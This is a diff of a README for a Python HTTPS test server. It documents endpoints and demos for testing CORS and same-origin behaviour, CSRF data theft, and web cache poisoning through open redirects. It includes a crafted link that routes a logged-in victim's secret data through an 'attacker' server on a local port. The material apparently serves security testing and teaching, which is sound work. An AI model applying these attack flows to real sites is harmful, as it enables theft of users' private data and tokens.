@@ -61,7 +61,7 @@ This is a multi-threaded HTTPS server based on python's simple http server. It i
       + `204 No Content`: page cached
       + `500 Server Error`: maximum cache memory reached, or page `{name}` already cached
     - Notes:
-      + Once saved, a page cannot be overwritten (until the server is shutdown) even if it is cleared from memory (see /cache/clear)
+      + Once saved, a page cannot be overwritten (until the server is shutdown) even if it is cleared from memory (see `/cache/clear`)
   * `GET /cache/{name}`: retrieve a previously saved page
     - Response codes:
       + `200 OK`: the body and `Content-Type` are as requested during caching
@@ -77,7 +77,7 @@ This is a multi-threaded HTTPS server based on python's simple http server. It i
       + `200 OK`: body contains a randomly generated UUID; use in `POST /cache/{uuid}`
   * `GET /goto/{address}`: redirect to this (URI-decoded) address
     - Response codes:
-      + `302 Found`: Location is the address which follows `/goto/`; if domain is not given it is taken from the `Referer`, `Origin`, `X-Forwarded-Host`, `X-Forwarded-For` or `Forwarded`
+      + `302 Found`: Location is the address which follows `/goto/`; if domain is not given (i.e. address does not start with `schema://` or `//`) it is taken from the `Referer`, `Origin`, `X-Forwarded-Host`, `X-Forwarded-For` or `Forwarded`
       + `200 OK`: empty body; this happens if address was relative (no domain) and neither of the aforementioned headers was given
     - Notes:
       + Unlike the address given as a `goto` parameter to some of the other endpoints, the address here is not URI-decoded
@@ -101,25 +101,27 @@ This is a multi-threaded HTTPS server based on python's simple http server. It i
 
 `/demos/sop` can be used to test the behaviour of various browsers (many old ones supported) when it comes to cross-origin requests.
 
-  * `getSecret.html`: fetches `/secret/secret.txt` or `/secret/secret.png` using 6 different methods (see below), for each requesting 5 CORS combinations from the server (see below); supported URL parameters:
+  * `getSecret.html`: fetches `/secret/secret.txt` or `/secret/secret.png` using eight different methods (see below), for each requesting five CORS combinations from the server (see below); supported URL parameters:
     - `host`: the full hostname/IP address:port of the target
     - `hostname`: only the hostname/IP address of the target; the port number will be the same as the origin
     - `port`: only the port number of the target; the hostname/IP address will be the same as the origin
 
-`getSecret.html` will log in to the target origin, and fetch `https://<target_origin>/secret/secret.<txt or png>?origin=...&creds=...` requesting each one of the following 5 CORS combinations from the server:
-  * Origin: `<as request origin>` , Credentials: true
-  * Origin: `<as request origin>` , Credentials: false
+`getSecret.html` will log in to the target origin, and fetch `https://{target_origin}/secret/secret.{txt|png}?origin=...&creds=...` requesting each one of the following 5 CORS combinations from the server:
+  * Origin: `{as request origin}` , Credentials: true
+  * Origin: `{as request origin}` , Credentials: false
   * Origin: `*` , Credentials: true
   * Origin: `*` , Credentials: false
   * no CORS headers
 
-It will do so using each the following six methods:
+It will do so using each the following eight methods:
   * GET `/secret/secret.txt` via XMLHttpRequest
   * POST `/secret/secret.txt` via XMLHttpRequest
   * GET `/secret/secret.txt` via `<iframe>`
   * GET `/secret/secret.txt` via `<object>`
   * GET `/secret/secret.png` via `<img>`, then draw it in a 2D canvas
+  * GET `/secret/secret.png` via `<img crossorigin="use-credentials">`, then draw it in a 2D canvas
   * GET `/secret/secret.png` via `<img>`, then draw it in a bitmap canvas
+  * GET `/secret/secret.png` via `<img crossorigin="use-credentials">`, then draw it in a bitmap canvas
 
 #### Running the server
 
@@ -136,27 +138,27 @@ python3 simple.py -l demos/sop/logs/requests_vary_host.log
 Visit:
 
 ```
-https://<IP_1>:58080/demos/sop/getSecret.html?hostname=<IP_2>
+https://{IP_1}:58080/demos/sop/getSecret.html?hostname={IP_2}
 ```
 
-replacing `<IP_1>` and `<IP_2>` with two different interfaces, e.g. `127.0.0.1` and `192.168.0.1`.
+replacing `{IP_1}` and `{IP_2}` with two different interfaces, e.g. `127.0.0.1` and `192.168.0.1`.
 
 2. Alternatively, start it only on one interface:
 
 ```bash
-python3 simple.py -a <IP> -l demos/sop/logs/requests_vary_host.log
+python3 simple.py -a {IP} -l demos/sop/logs/requests_vary_host.log
 ```
 
 and use a DNS name which resolves to the interface's IP address:
 
 ```
-https://<IP>:58080/demos/sop/getSecret.html?hostname=<hostname>
+https://{IP}:58080/demos/sop/getSecret.html?hostname={hostname}
 ```
 
 or:
 
 ```
-https://<hostname>:58080/demos/sop/getSecret.html?hostname=<IP>
+https://{hostname}:58080/demos/sop/getSecret.html?hostname={IP}
 ```
 
 You can omit the hostname URL parameter if listening on `localhost` and `localhost` has the `127.0.0.1` address. `getSecret.html` will detect that and use `localhost` or `127.0.0.1` as the target domain (if the origin is `127.0.0.1` or `localhost` respectively).
@@ -164,14 +166,14 @@ You can omit the hostname URL parameter if listening on `localhost` and `localho
 3. Alternatively, run two different instances on one interface but different ports:
 
 ```bash
-python3 simple.py -a <IP> -p 58081 -l demos/sop/logs/requests_vary_port_target.log
-python3 simple.py -a <IP> -p 58082 -l demos/sop/logs/requests_vary_port_origin.log
+python3 simple.py -a {IP} -p 58081 -l demos/sop/logs/requests_vary_port_target.log
+python3 simple.py -a {IP} -p 58082 -l demos/sop/logs/requests_vary_port_origin.log
 ```
 
 then visit:
 
 ```
-https://<IP>:58082/demos/sop/getSecret.html?port=58081
+https://{IP}:58082/demos/sop/getSecret.html?port=58081
 ```
 
 #### Viewing results, logging to file and parsing it
@@ -221,20 +223,17 @@ python3 simple.py
 Visit `getData.html` in one browser:
 
 ```
-https://<IP>:58080/demos/csrf/getData.html
+https://{IP}:58080/demos/csrf/getData.html
 ```
 
 then input the target URL in the input box, e.g.:
 
 ```
-https://<IP>:58080/secret/secret.html
+https://{IP}:58080/secret/secret.html
 ```
 
-Copy the generated victim URL. Click on the link "Click here to wait for the
-stolen data". Open the copied link in another browser.
-Refresh the cached page to see the stolen secret data.
-
-Note: The cached page should refresh itself every 30s.
+Copy the generated victim URL and open it in another browser. Click on the
+link "Click here to wait for the stolen data" to see the stolen secret data.
 
 ## Stealing information via web cache poisoning or open redirects
 
@@ -244,21 +243,22 @@ attcker. Usually this happens if the application exposes internal data in a way
 it can be tampered with by a malicious user. Two common examples are:
   * Open redirect: A vulnerable page may redirect the user based on a URL
     parameter, which is normally set by another page on the app; e.g. `/admin`
-    send an unauthenticated user to `/login?returnURL=%2fadmin` and `/login`
+    sends an unauthenticated user to `/login?returnURL=%2fadmin` and `/login`
     trusts the `redirectURL` parameter. A successful login may also append secret
     authentication tokens to the URL it redirects to as is often done in OpenID
     and OAuth implementations.
   * Web cache poisoning: A web application is hidden behind a caching proxy and
-    dynamically updates all links on it to point to the domain name in the
-    `X-Forwarded-Host` header, which is normally set by the proxy and not
+		dynamically updates all links on it to point to the domain name given in
+		the `X-Forwarded-Host` header, which is normally set by the proxy and not
     checked. The proxy may erroneously serve cached content with a malicious
     attacker-supplied `X-Forwarded-Host` to other victim users.
 
 `demos/evil_proxy/vuln.html` is a simple example of a vulnerable page which
 takes the path of a caching endpoint (e.g. `/cache`) from a URL parameter
-without validating it. It then asks the caching endpoint for a new random
-token, which should be kept secret, and submits to it sensitive data available
-only to the user viewing the page.
+without validating it. It then generates a new random token, which represents
+a secret unguessable token, and caches sensitive data available only to the
+user viewing the page (`/secret/secret.txt` requiring a cookie) using the token
+as a name.
 
 #### Running the server
 
@@ -276,11 +276,16 @@ Attacker:
 python3 simple.py -O -c -p 58081
 ```
 
-The "attacker" sends the "victim" the following link with a spoofed `cacheURI`:
+The "victim" has previously logged in at `http://localhost:58080/login`. The
+"attacker" sends the "victim" the following link with a spoofed `cacheURI`:
 
 ```
 http://localhost:58080/demos/evil_proxy/vuln.html?cacheURI=http%3a%2f%2f127.0.0.1:58081%2fgoto%2f%2fcache
 ```
+
+The data sent to the cache, as well as the action of the user clicking on the
+link to view the data, is proxied via the attacker, in an almost
+indistinguishable way:
 
 ![](demos/poc_evil_proxy_token.png)
 
@@ -291,8 +296,8 @@ http://localhost:58080/demos/evil_proxy/vuln.html?cacheURI=http%3a%2f%2f127.0.0.
 ```
 usage: simple.py [-h] [-a IP] [-p PORT] [-o [Origin [Origin ...]] | -O]
                  [-x [Header: Value [Header: Value ...]]]
-                 [-m [Header: Value [Header: Value ...]]] [-c] [-s] [-C FILE]
-                 [-K FILE] [-H [Header: Value [Header: Value ...]]]
+                 [-m [Method [Method ...]]] [-c] [-s] [-C FILE] [-K FILE]
+                 [-H [Header: Value [Header: Value ...]]]
                  [-S [DIR|FILE [DIR|FILE ...]]] [-l FILE] [-d] [-t]
 
 Serve the current working directory over HTTPS and with custom headers. The
@@ -320,7 +325,7 @@ CORS options (requires -o or -O):
                         Headers allowed for CORS requests. (default:
                         ['Accept', 'Accept-Language', 'Content-Language',
                         'Content-Type', 'Authorization'])
-  -m [Header: Value [Header: Value ...]], --allowed-methods [Header: Value [Header: Value ...]]
+  -m [Method [Method ...]], --allowed-methods [Method [Method ...]]
                         Methods allowed for CORS requests. (default: ['POST',
                         'GET', 'OPTIONS', 'HEAD'])
   -c, --allow-credentials
